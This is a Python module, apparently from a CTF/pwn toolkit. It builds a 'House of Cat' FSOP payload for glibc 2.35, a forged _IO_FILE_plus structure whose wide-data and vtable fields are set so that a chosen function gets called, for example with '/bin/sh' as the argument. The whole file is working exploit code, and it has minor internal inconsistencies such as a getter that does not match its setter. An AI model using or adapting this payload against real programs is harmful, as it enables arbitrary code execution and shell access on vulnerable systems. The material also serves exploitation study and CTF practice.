from typing import Any

from ...typing import p64
from ...context import libc
from .struct import IO_FILE_plus


class HouseOfCat:
    """
    FSOP 版本的 house_of_cat，在 2.35 下测试通过，返回一个 fake_IO payload
        rdi: 仅能设置 rdi 指针所指向的内容
        rdx: rdx 寄存器内容
        fake_io_addr: fake_IO 的地址
        call_addr: 调用的地址

        e.g.
            cat = house_of_cat()
            cat.fake_io_addr = heap
            cat.rdi = b"/bin/sh\x00"
            cat.rdx = p64(0xcafec0de)
            cat.call_addr = p64(backd00r)
            cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)

            send(bytes(cat))
    """

    MAPPING = {
        "rdi": "_flags",
        "rdx": "_IO_backup_base",
        "fake_io_addr": "_wide_data",
        "call_addr": "_IO_save_end",
        # "writable": "_lock",
        "vtable": "vtable",
    }
    rdi: int = 0
    rdx: int = 0
    fake_io_addr: int = 0
    call_addr: int = 0
    # writable: int = 0  # seems no need
    vtable: int = 0

    def __init__(self):
        print("house", id(libc))
        self.file = IO_FILE_plus()
        self.file._mode = 1  # mode <= 0 (_IO_flush_all_lockp)
        self.file._IO_save_base = 1  # mode == 0 (_IO_wfile_seekoff)
        self.file._IO_write_ptr = 1  # was_writing (_IO_wfile_seekoff)
        setattr(self, "vtable", libc.sym["_IO_wfile_jumps"] + 0x30)

    def __setattr__(self, __name: str, __value: Any) -> None:
        if __name in self.MAPPING:
            if __name == "fake_io_addr":
                self.file._wide_data = __value + 0x30  # rax1
            else:
                setattr(self.file, self.MAPPING[__name], __value)
        else:
            super().__setattr__(__name, __value)

    def __getattr__(self, __name: str) -> Any:
        if __name in self.MAPPING:
            if __name == "fake_io_addr":
                return self.file._IO_backup_base - 0xB0
            return getattr(self.file, self.MAPPING[__name])
        else:
            return super().__getattr__(__name)

    def __bytes__(self) -> bytes:
        return bytes(self.file).ljust(0x110, b"\x00") + p64(
            self.file._wide_data + 0x10
        )  # rax2

    def __call__(self, **kwds: Any) -> Any:
        for k, v in kwds.items():
            setattr(self, k, v)
        return self
